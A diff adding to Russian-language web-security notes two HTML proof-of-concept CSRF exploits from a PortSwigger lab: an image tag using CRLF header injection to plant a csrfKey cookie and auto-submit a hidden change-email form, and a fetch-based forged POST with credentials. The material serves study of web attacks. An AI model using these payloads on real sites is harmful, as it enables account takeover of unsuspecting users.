@@ -28,6 +28,60 @@ Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execut
 
 ```
 
+Другой пример из задания с [PortSwigger Web Academy](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
+
+```markup
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>CSRF Exploit via form</title>
+    </head>
+    <body>
+        <div>Test</div>
+        <!-- Inject csrfKey Header -->
+        <img src="https://server.net/?search=test%0D%0ASet-Cookie:%20csrfKey=PENWcyjyCcXvvIuUyZF9c8ruxJvKywzW" onerror="document.forms[0].submit()">
+        <!-- Submit Form -->
+        <form method="POST" action="https://server.net/change-email">
+            <input type="hidden" name="email" value="carlos@carlos-montoya.net">
+            <input type="hidden" name="csrf" value="vYD0yIuvFYpOnh54szpuhVWA2IFqqnAJ">
+        </form>
+    </body>
+</html>
+```
+
+или CSRF Exploit via fetch mechanism
+
+```markup
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>CSRF Exploit via js/fetch</title>
+    </head>
+    <body>
+        <div>Test</div>
+        <script>
+            let data = {
+                email: 'carlos-was-here@normal-users.net',
+                csrf: 'G3dL0Wq0QSDmZyFTIgcGODJywPgVKR8v'
+            };
+            fetch("https://server.net/change-email", {
+                method: 'POST',
+                mode: 'no-cors',
+                cache: 'no-cache',
+                body: new URLSearchParams(data),
+                credentials: 'include',
+                headers: {
+                    Cookie: 'csrfKey=4dX2Yco3WYR1gnSouSIoMsRP4AZSuFmr;',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                redirect: 'follow'
+            });
+        </script>
+
+    </body>
+</html>
+```
+
 ### XS-Search
 
 Это Side-Channel атака для получения доступа к информации, к которой другие пользователи имеют доступ, а атакующий не имеет
